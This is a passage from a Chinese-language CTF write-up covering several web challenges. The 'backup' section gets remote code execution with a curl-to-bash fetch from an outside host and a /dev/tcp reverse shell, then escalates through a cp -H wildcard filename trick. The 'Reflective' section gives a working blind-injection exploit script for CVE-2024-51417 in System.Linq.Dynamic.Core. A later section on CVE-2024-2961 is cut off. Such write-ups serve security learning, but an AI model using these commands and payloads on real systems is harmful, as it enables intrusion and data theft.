dicts[i];</span><br><span class="line">            <span class="title function_">probeError</span>(flag + char);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">leak</span>(<span class="string">&#x27;nctf&#123;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>此处vps必须是个ip的，用webhook等url会跳转成为https协议，不太确定原因，估计远端设置出了问题</p>
<h3 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h3><p>源码中显示的是<code>__2025.happy.new.year</code>作为传参参数，为什么是<code>_[2025.happy.new.year</code>?@董明洋 </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$cmd = $_REQUEST[&quot;__2025.happy.new.year&quot;];</span></span><br><span class="line">源码中有cmd，尝试传参发现成功rce</span><br><span class="line"></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//60.205.163.215:42632/?_[2025.happy.new.year=curl%20http://vztz2l98.requestrepo.com/1.txt%20|%20bash</span></span><br><span class="line"></span><br><span class="line">nohup bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/207.244.108.40/40633 0&gt;&amp;1&#x27;</span> &amp;</span><br></pre></td></tr></table></figure>

<p>-r——–   1 root root   43 Oct  9 21:51 flag  需提权</p>
<p>发现一个backup 正与题目名字对应</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/primary</span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">cp</span> -P * /var/www/html/backup/</span><br><span class="line">    <span class="built_in">chmod</span> 755 -R /var/www/html/backup/</span><br><span class="line">    <span class="built_in">sleep</span> 15s</span><br></pre></td></tr></table></figure>

<p>翻翻看看cp有什么能利用的地方</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-H                           follow command-line symbolic links <span class="keyword">in</span> <span class="variable constant_">SOURCE</span></span><br></pre></td></tr></table></figure>

<p>-H 参数可以深拷贝链接文件，用了*，则可以构造 -H 文件名</p>
<p>echo ‘ ‘ &gt; .&#x2F;primary&#x2F;‘-H’</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ls</span> <span class="string">-alR</span></span><br><span class="line"><span class="string">.:</span></span><br><span class="line"><span class="string">total</span> <span class="number">120</span></span><br><span class="line"><span class="string">drwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>  <span class="number">4096 </span><span class="string">Jan</span> <span class="number">25</span>  <span class="number">2025</span> <span class="string">.</span></span><br><span class="line"><span class="string">drwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>  <span class="number">4096 </span><span class="string">Jan</span> <span class="number">25</span>  <span class="number">2025</span> <span class="string">..</span></span><br><span class="line"><span class="string">drwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>  <span class="number">4096 </span><span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">backup</span></span><br><span class="line"><span class="string">-rwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span> <span class="number">87382</span> <span class="string">Jan</span> <span class="number">25</span>  <span class="number">2025 </span><span class="string">index.php</span></span><br><span class="line"><span class="string">drwxrwxrwx</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>  <span class="number">4096 </span><span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">primary</span></span><br><span class="line"></span><br><span class="line"><span class="string">./backup:</span></span><br><span class="line"><span class="string">total</span> <span class="number">20</span></span><br><span class="line"><span class="string">drwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span> <span class="number">4096 </span><span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">.</span></span><br><span class="line"><span class="string">drwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span> <span class="number">4096 </span><span class="string">Jan</span> <span class="number">25</span>  <span class="number">2025</span> <span class="string">..</span></span><br><span class="line"><span class="string">lrwxrwxrwx</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">5</span> <span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:07</span> <span class="string">f1</span> <span class="string">-&gt;</span> <span class="string">/flag</span></span><br><span class="line"><span class="string">-rwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>   <span class="number">43</span> <span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">f2</span></span><br><span class="line"><span class="string">-rwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span> <span class="string">root</span>    <span class="number">0</span> <span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">keep.txt</span></span><br><span class="line"></span><br><span class="line"><span class="string">./primary:</span></span><br><span class="line"><span class="string">total</span> <span class="number">20</span></span><br><span class="line"><span class="string">-rw-r--r--</span> <span class="number">1</span> <span class="string">www-data</span> <span class="string">www-data</span>    <span class="number">1</span> <span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:07</span> <span class="string">-H</span></span><br><span class="line"><span class="string">drwxrwxrwx</span> <span class="number">1</span> <span class="string">root</span>     <span class="string">root</span>     <span class="number">4096 </span><span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">.</span></span><br><span class="line"><span class="string">drwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span>     <span class="string">root</span>     <span class="number">4096 </span><span class="string">Jan</span> <span class="number">25</span>  <span class="number">2025</span> <span class="string">..</span></span><br><span class="line"><span class="string">lrwxrwxrwx</span> <span class="number">1</span> <span class="string">www-data</span> <span class="string">www-data</span>    <span class="number">5</span> <span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:05</span> <span class="string">f1</span> <span class="string">-&gt;</span> <span class="string">/flag</span></span><br><span class="line"><span class="string">lrwxrwxrwx</span> <span class="number">1</span> <span class="string">www-data</span> <span class="string">www-data</span>    <span class="number">5</span> <span class="string">Oct</span>  <span class="number">9</span> <span class="number">22</span><span class="string">:08</span> <span class="string">f2</span> <span class="string">-&gt;</span> <span class="string">/flag</span></span><br><span class="line"><span class="string">-rwxr-xr-x</span> <span class="number">1</span> <span class="string">root</span>     <span class="string">root</span>        <span class="number">0</span> <span class="string">Jan</span> <span class="number">25</span>  <span class="number">2025 </span><span class="string">keep.txt</span></span><br></pre></td></tr></table></figure>

<p>可以看到作为flag 的软链接，f2 被深拷贝赋予了755 的权限，可读</p>
<h3 id="Reflective"><a href="#Reflective" class="headerlink" title="Reflective"></a>Reflective</h3><p>看一眼flag位置</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">static</span> readonly string _flag = <span class="string">&quot;crew&#123;fake_flag&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>是一个私有的只读字符串</p>
<p>查一下，发现最符合的是一个cve，用反射方法读私有属性</p>
<p>CVE-2024-51417</p>
<p><a target="_blank" rel="noopener" href="https://github.com/zzzprojects/System.Linq.Dynamic.Core/issues/867">CVE-2024-51417: System.Linq.Dynamic.Core allows remote access to properties on reflection types and </a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-4cv2-4hjh-77rx">CVE-2024-51417 - GitHub Advisory Database</a></p>
<p>search 参数处理不严，存在表达式注入，允许执行.NET 反射代码</p>
<p>用反射逐层访问内存：从应用域→程序集→类型→字段，最终定位到存储 flag 的字段</p>
<p>访问 flag [index]，索引越界触发 500 错误，首个错误索引即长度</p>
<p>对每个位置用二分查找，通过 “flag [index] &gt; 字符” 的条件判断（成立返回 200，否则触发除零错误返回 500），确定具体字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, as_completed</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://60.205.163.215:54530&#x27;</span></span><br><span class="line">MAX_THREADS = <span class="number">20</span>  <span class="comment"># 适当减少线程数，避免冲突</span></span><br><span class="line">REQUEST_DELAY = <span class="number">0.1</span>  <span class="comment"># 增加延迟，提高稳定性</span></span><br><span class="line">MAX_LENGTH = <span class="number">60</span>  <span class="comment"># 最大可能的flag长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request</span>(<span class="params">idx, char=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;构造请求并返回结果&quot;&quot;&quot;</span></span><br><span class="line">    FieldGetValue = <span class="string">&#x27;&quot;&quot;.GetType().Assembly.DefinedTypes.Where(it.Name==&quot;FieldInfo&quot;).First().DeclaredMethods.Where(it.Name==&quot;GetValue&quot;).First()&#x27;</span></span><br><span class="line">    ArrayGetValue = <span class="string">&#x27;&quot;&quot;.GetType().Assembly.DefinedTypes.Where(it.Name==&quot;Array&quot;).First().DeclaredMethods.Where(it.Name==&quot;GetValue&quot;).First()&#x27;</span></span><br><span class="line">    CurrentDomain = <span class="string">&#x27;APPDOMAIN.DeclaredProperties.Where(p =&gt; p.Name == &quot;CurrentDomain&quot;).First().GetValue(null)&#x27;</span></span><br><span class="line">    AppDomain = <span class="string">&#x27;&quot;&quot;.GetType().Assembly.DefinedTypes.Where(it.Name == &quot;AppDomain&quot;).First()&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">r&quot;&quot;&quot;&quot;) &amp;&amp; </span></span><br><span class="line"><span class="string">    FIELDGETVALUE.Invoke(</span></span><br><span class="line"><span class="string">    ARRAYGETVALUE.Invoke(</span></span><br><span class="line"><span class="string">    ARRAYGETVALUE.Invoke(</span></span><br><span class="line"><span class="string">    ARRAYGETVALUE.Invoke(</span></span><br><span class="line"><span class="string">        APPDOMAIN.DeclaredMethods.Where(it.Name==&quot;GetAssemblies&quot;).First().Invoke(</span></span><br><span class="line"><span class="string">            CURRENTDOMAIN, null),</span></span><br><span class="line"><span class="string">        new object[]&#123;new int[]&#123;96&#125;&#125;).DefinedTypes,</span></span><br><span class="line"><span class="string">        new object[]&#123;new int[]&#123;1&#125; &#125;).DeclaredFields,</span></span><br><span class="line"><span class="string">        new object[]&#123;new int[]&#123;1&#125; &#125;)</span></span><br><span class="line"><span class="string">    , new object[]&#123;null&#125;).ToString()[INS1] &gt; INS2(&quot;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.strip()</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">&quot;INS1&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;INS2&quot;</span>, <span class="string">f&quot;&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(char)&#125;</span>&#x27; || 1/0 == 1 &amp;&amp; \&quot;\&quot; == &quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = payload.replace(<span class="string">&quot;INS2&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = payload.replace(<span class="string">&quot;FIELDGETVALUE&quot;</span>, FieldGetValue)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;ARRAYGETVALUE&quot;</span>, ArrayGetValue)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;CURRENTDOMAIN&quot;</span>, CurrentDomain)</span><br><span class="line">    payload = payload.replace(<span class="string">&quot;APPDOMAIN&quot;</span>, AppDomain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        time.sleep(REQUEST_DELAY)</span><br><span class="line">        r = httpx.get(</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/Notes&quot;</span>, </span><br><span class="line">            params=<span class="built_in">dict</span>(search=payload),</span><br><span class="line">            timeout=<span class="number">10</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> r.status_code</span><br><span class="line">    <span class="keyword">except</span> httpx.exceptions.HTTPError:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">500</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag_length</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;改进的多线程探测flag长度&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 使用线程安全的变量存储结果</span></span><br><span class="line">    found_length = <span class="literal">None</span></span><br><span class="line">    found_event = threading.Event()  <span class="comment"># 用于通知所有线程已找到结果</span></span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">probe_index</span>(<span class="params">idx</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;探测单个索引是否越界&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">nonlocal</span> found_length</span><br><span class="line">        <span class="comment"># 如果已经找到结果，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> found_event.is_set():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        status = request(idx)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查是否越界（500错误）</span></span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">500</span>:</span><br><span class="line">            <span class="keyword">with</span> lock:</span><br><span class="line">                <span class="keyword">if</span> found_length <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    found_length = idx</span><br><span class="line">                    found_event.<span class="built_in">set</span>()  <span class="comment"># 通知其他线程</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 短暂延迟，避免请求过于密集</span></span><br><span class="line">        time.sleep(REQUEST_DELAY)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建线程池</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=MAX_THREADS) <span class="keyword">as</span> executor:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;多线程探测长度中...&quot;</span>)</span><br><span class="line">        futures = []</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 提交探测任务，从0到MAX_LENGTH</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(MAX_LENGTH + <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 如果已经找到结果，停止提交新任务</span></span><br><span class="line">            <span class="keyword">if</span> found_event.is_set():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            futures.append(executor.submit(probe_index, idx))</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 监控结果，一旦找到就取消所有未完成任务</span></span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> as_completed(futures):</span><br><span class="line">            <span class="keyword">if</span> found_event.is_set():</span><br><span class="line">                <span class="comment"># 取消所有未完成的任务</span></span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> futures:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> f.done():</span><br><span class="line">                        f.cancel()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证找到的长度（关键改进：增加验证步骤）</span></span><br><span class="line">    <span class="keyword">if</span> found_length <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 验证前一个索引是否有效</span></span><br><span class="line">        <span class="keyword">if</span> found_length &gt; <span class="number">0</span>:</span><br><span class="line">            prev_status = request(found_length - <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> prev_status == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> found_length</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;长度验证失败，重新探测...&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> get_flag_length()  <span class="comment"># 验证失败则重新探测</span></span><br><span class="line">        <span class="keyword">return</span> found_length</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果没找到，返回默认最大长度</span></span><br><span class="line">    <span class="keyword">return</span> MAX_LENGTH</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">binary_search_char</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;通过二分查找获取指定位置的字符&quot;&quot;&quot;</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    result = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        status = request(index, mid)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> status == <span class="number">200</span>:</span><br><span class="line">            result = mid</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        time.sleep(REQUEST_DELAY)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">chr</span>(result + <span class="number">1</span>) <span class="keyword">if</span> (result + <span class="number">1</span>) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="built_in">chr</span>(result)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始探测flag长度...&quot;</span>)</span><br><span class="line">    flag_length = get_flag_length()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n确认flag长度: <span class="subst">&#123;flag_length&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag_length &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无法确定flag长度&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始多线程获取flag字符...&quot;</span>)</span><br><span class="line">    flag = [<span class="string">&#x27;&#x27;</span>] * flag_length</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(max_workers=MAX_THREADS) <span class="keyword">as</span> executor:</span><br><span class="line">        futures = &#123;executor.submit(binary_search_char, i): i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(flag_length)&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> future <span class="keyword">in</span> tqdm(as_completed(futures), total=flag_length, desc=<span class="string">&quot;获取中&quot;</span>):</span><br><span class="line">            index = futures[future]</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                char = future.result()</span><br><span class="line">                flag[index] = char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\r当前flag: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(flag)&#125;</span>&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;\n位置 <span class="subst">&#123;index&#125;</span> 发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">                flag[index] = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n完整flag: <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">flag&#123;Y0u_3re_mAstEr_0f_L1nq_3nd_net&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>后续</li>
</ul>
<p>既然可以盲注了为什么不试试直接注出完整内容呢</p>
<p>调用set_Title方法来回显</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;) and true &amp;&amp; it.GetType().Assembly.DefinedTypes.Where(t=&gt;t.FullName==&quot;</span>Reflective.Note<span class="string">&quot;).First().DeclaredMethods.Where(m=&gt;m.Name==&quot;</span>set_Title<span class="string">&quot;).First().Invoke(it,new System.Object[]&#123;((&quot;</span><span class="string">&quot;).GetType().Assembly.DefinedTypes.Where(t=&gt;t.FullName==&quot;</span>System.Reflection.Assembly<span class="string">&quot;).First().DeclaredMethods.Where(m=&gt;m.Name==&quot;</span>CreateInstance<span class="string">&quot;).First().Invoke((&quot;</span><span class="string">&quot;).GetType().Assembly.DefinedTypes.Where(t=&gt;t.FullName==&quot;</span>System.Array<span class="string">&quot;).First().DeclaredMethods.Where(m=&gt;m.Name==&quot;</span>GetValue<span class="string">&quot;).First().Invoke((&quot;</span><span class="string">&quot;).GetType().Assembly.DefinedTypes.Where(t=&gt;t.FullName==&quot;</span>System.AppDomain<span class="string">&quot;).First().DeclaredMethods.Where(m=&gt;m.Name==&quot;</span>GetAssemblies<span class="string">&quot;).First().Invoke((&quot;</span><span class="string">&quot;).GetType().Assembly.DefinedTypes.Where(t=&gt;t.FullName==&quot;</span>System.AppDomain<span class="string">&quot;).First().DeclaredProperties.Where(p=&gt;p.Name==&quot;</span>CurrentDomain<span class="string">&quot;).First().GetValue(null),new System.Object[]&#123;&#125;),new System.Object[]&#123; new [] &#123; 96 &#125; &#125;),new System.Object[]&#123; &quot;</span>BookKeeper.NotesManage<span class="string">r&quot; &#125;)).GetType().Assembly.DefinedTypes.Where(tt=&gt;tt.Name==&quot;</span>NotesManage<span class="string">r&quot;).First().DeclaredFields.Where(f=&gt;f.Name==&quot;</span>_flag<span class="string">&quot;).First().GetValue(null).ToString()&#125;)==null and Title.StartsWith(&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="？？Gavatar"><a href="#？？Gavatar" class="headerlink" title="？？Gavatar"></a>？？Gavatar</h3><p>CVE-2024-2961</p>
<p><a target="_blank" rel="noopener" href="https://github.com/regantemudo/PHP-file-read-to-RCE-CVE-2024-2961-/blob/main/exploit.py">PHP-file-read-to-RCE-CVE-2024-2961-&#x2F;exploit.py at main · regantemudo&#x2F;PHP-file-read-to-RCE-CVE-2024-2</a></p>
<p>补一点header即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 